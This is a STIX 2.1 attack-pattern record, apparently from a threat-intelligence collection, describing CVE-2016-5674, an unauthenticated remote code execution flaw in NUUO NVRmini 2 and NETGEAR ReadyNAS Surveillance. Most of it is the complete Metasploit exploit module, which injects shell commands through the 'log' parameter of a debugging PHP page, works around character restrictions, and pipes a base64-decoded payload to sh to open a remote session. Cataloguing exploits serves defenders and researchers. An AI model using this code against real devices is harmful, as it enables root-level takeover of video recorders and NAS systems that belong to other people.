{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--58781d10-d205-4a5e-86d6-bdf309ed34f5",
    "created": "2024-08-14T17:00:40.546221Z",
    "modified": "2024-08-14T17:00:40.546225Z",
    "name": "NUUO NVRmini 2 / NETGEAR ReadyNAS Surveillance Unauthenticated Remote Code Execution",
    "description": " The NVRmini 2 Network Video Recorder and the ReadyNAS Surveillance application are vulnerable to an unauthenticated remote code execution on the exposed web administration interface. This results in code execution as root in the NVRmini and the 'admin' user in ReadyNAS. This exploit has been tested on several versions of the NVRmini 2 and the ReadyNAS Surveillance. It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested in those devices. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nuuo_nvrmini_unauth_rce.rb",
            "external_id": "nuuo_nvrmini_unauth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-5674"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-nvr-vulns.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2016/Aug/45"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'NUUO NVRmini 2 / NETGEAR ReadyNAS Surveillance Unauthenticated Remote Code Execution',\n      'Description' => %q{\n        The NVRmini 2 Network Video Recorder and the ReadyNAS Surveillance application are vulnerable\n        to an unauthenticated remote code execution on the exposed web administration interface.\n        This results in code execution as root in the NVRmini and the 'admin' user in ReadyNAS.\n        This exploit has been tested on several versions of the NVRmini 2 and the ReadyNAS Surveillance.\n        It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested\n        in those devices.\n      },\n      'Author' =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2016-5674'],\n          ['US-CERT-VU', '856152'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-nvr-vulns.txt'],\n          ['URL', 'https://seclists.org/bugtraq/2016/Aug/45']\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 5 },\n      'Platform' => 'unix',\n      'Arch' => ARCH_CMD,\n      'Privileged' => false,  # Runs as root in NVRmini 2, admin in ReadyNas\n      'Payload' =>\n        {\n          'Space' => 1024,    # Actually it might be the GET request length, but this is a safe value\n          'DisableNops' => true,\n          # No encoder works, so we have to work around these badchars manually\n          #'BadChars'    => \"\\x2f\\x00\\x3b\\x27\\x22\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'openssl generic telnet perl'\n            }\n        },\n      'Targets' =>\n        [\n          [ 'Automatic', { } ],\n          [ 'NUUO NVRmini 2', { } ],\n          [ 'ReadyNAS NETGEAR Surveillance', { } ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2016-08-04'))\n\n    register_options(\n      [\n        Opt::RPORT(8081),\n        OptString.new('TARGETURI', [true,  \"Application path\", '/'])\n      ])\n  end\n\n\n  def send_payload (payload, wait)\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], \"__debugging_center_utils___.php\"),\n      'vars_get' => { 'log' => rand_text_alpha(8 + rand(8)) + \";\" + payload }\n    }, wait)\n    return res\n  end\n\n\n  def check\n    echo = rand_text_alpha(9 + rand(9))\n    res = send_payload(\"echo #{echo}\", 20)\n    if res && res.body.to_s =~ /([#{echo}]{2})/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def id_target\n    return target if target.name != 'Automatic'\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'])\n    })\n    if res && res.code == 200\n      if res.body.to_s =~ /var VENDOR_NAME = \"Netgear\";/\n        print_status(\"#{peer} - Identified NETGEAR ReadyNAS Surveillance as the target.\")\n        return targets[2]\n      else\n        print_status(\"#{peer} - Identified NUUO NVRMini 2 as the target.\")\n        return targets[1]\n      end\n    end\n  end\n\n\n  def exploit\n    my_target = id_target\n    if my_target == targets[1]\n      #\n      # The command cannot have forward slashes, single quotes or double quotes, so we remove\n      # the redir to /dev/null and the single quotes in the Metasploit payload. Because of the\n      # latter we also have to remove the \"sh -c\" part for the command to execute properly.\n      #\n      # This all sounds messy, but it was impossible to get any payload to encode properly as the\n      # target is an embedded system without base64, perl, python, ruby and similar utilities.\n      #\n      # We also have to check for perl, awk and lua as these are valid payloads for the ReadyNAS\n      # but not for the NVRmini 2.\n      #\n      # Also because of Metasploit payload limitations we cannot specify different payload constraints\n      # for different targets, so we use the payload raw for the NVRmini 2 and encoded for the ReadyNAS.\n      #\n      if payload.raw.include?(\"perl\")\n        fail_with(Failure::Unknown, \"The NVRmini 2 only supports generic or telnet payloads.\")\n      end\n      payload_clean = payload.raw.gsub('>/dev/null', '').gsub('sh -c', '').gsub('\"','').gsub(\"'\",'')\n      if not payload_clean =~ /([\\/'\"]+)/\n        print_status(\"#{peer} - Executing payload...\")\n        send_payload(payload_clean, 1)\n        handler\n      else\n        fail_with(Failure::Unknown, \"Your payload cannot have any of the following characters: / ' \\\"\")\n      end\n    elsif my_target == targets[2]\n      #\n      # The ReadyNAS has less char restrictions (it only fails with forward slash) but it also\n      # does not have the telnet binary.\n      # We also have to fix the perl payload - there's an IO import error on the ReadyNAS that blows\n      # it up.\n      #\n      if payload.raw.include? \"telnet\"\n        fail_with(Failure::Unknown, \"ReadyNAS Surveillance does not support telnet payloads (try openssl or perl).\")\n      end\n      print_status(\"#{peer} - Executing payload...\")\n      payload_clean = payload.raw.gsub(\"-MIO \", \"-MIO::Socket \")\n      send_payload(\"echo #{Rex::Text.encode_base64(payload_clean)} | base64 -d | sh\", 1)\n      handler\n    else\n      fail_with(Failure::Unknown, \"Failed to pick a target\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}